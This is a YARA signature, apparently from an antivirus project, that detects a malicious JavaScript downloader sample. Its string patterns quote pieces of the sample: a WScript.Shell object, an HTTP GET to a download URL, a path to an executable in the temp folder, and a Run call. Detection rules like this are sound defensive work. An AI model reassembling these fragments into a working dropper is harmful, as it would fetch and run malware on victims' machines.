rule sig_20160330_d182caed8c7446b04fef3d8db7e49fc2 {
  meta:
    description = "datamaliciousorder - file 20160330_d182caed8c7446b04fef3d8db7e49fc2.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "43a0d5bf12a695a07ad40dace084d5f371d24b291cb58addd06fb67df79c80d1"

  strings:
    $s1  = "function _Z(_ZG, _C1){_S0 = _S0 * 1; return _ZG - _C1;};" fullword ascii
    $s2  = "var _C0 = function _GW() {return WScript[_H](\"WScript\"+\".Shell\");}(), _VL = 11;" fullword ascii
    $s3  = "_LW[_D](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s4  = "if (_LW[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _CY() {return _C0[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"umz8sv1lDz71.ex\" + \"e\";};" fullword ascii
    $s6  = "function _S(){return _SZ + \"\";};" fullword ascii
    $s7  = "function _XR(_YS){_C0[\"Run\"](_YS, _S0, _S0);};" fullword ascii
    $s8  = "function _RL() {return ((_I == true) && (_I == _EV)) ? 1 : _S0;};" fullword ascii
    $s9  = "var _XW = new this[\"Date\"]();" fullword ascii
    $s10 = "function _B(_FZ) {var _C = (1, 2, 3, 4, 5, _FZ); return _C;};" fullword ascii
    $s11 = "function _EC(){return _H;};" fullword ascii
    $s12 = "return _Z(_F, _V0);" fullword ascii
    $s13 = " while (_RP){" fullword ascii
    $s14 = "function _GB(){return 22;};" fullword ascii
    $s15 = "function _VP()" fullword ascii
    $s16 = "var _I = false;" fullword ascii
    $s17 = "_I = true; " fullword ascii
    $s18 = "_EV = true; " fullword ascii
    $s19 = "var _EV = false;" fullword ascii
    $s20 = "} catch(_N){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}